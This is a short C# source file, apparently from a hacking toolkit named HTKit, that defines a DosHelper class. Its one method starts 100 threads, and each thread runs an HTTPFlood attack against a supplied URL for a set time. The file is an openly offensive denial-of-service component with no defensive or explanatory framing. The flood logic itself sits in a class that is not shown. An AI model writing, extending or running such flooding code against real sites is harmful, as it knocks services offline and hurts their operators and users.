using HTKit.Attacks;

namespace HTKit.Helpers;

public class DosHelper
{
    public void StartHTTPFlood(string url, int time)
    {
        for (int i = 0; i < 100; i++)
        {
            HTTPFlood httpFlood = new HTTPFlood();
            Thread thread = new Thread(new ThreadStart(() => httpFlood.Start(url, time)));
            thread.Start();
        }
    }
}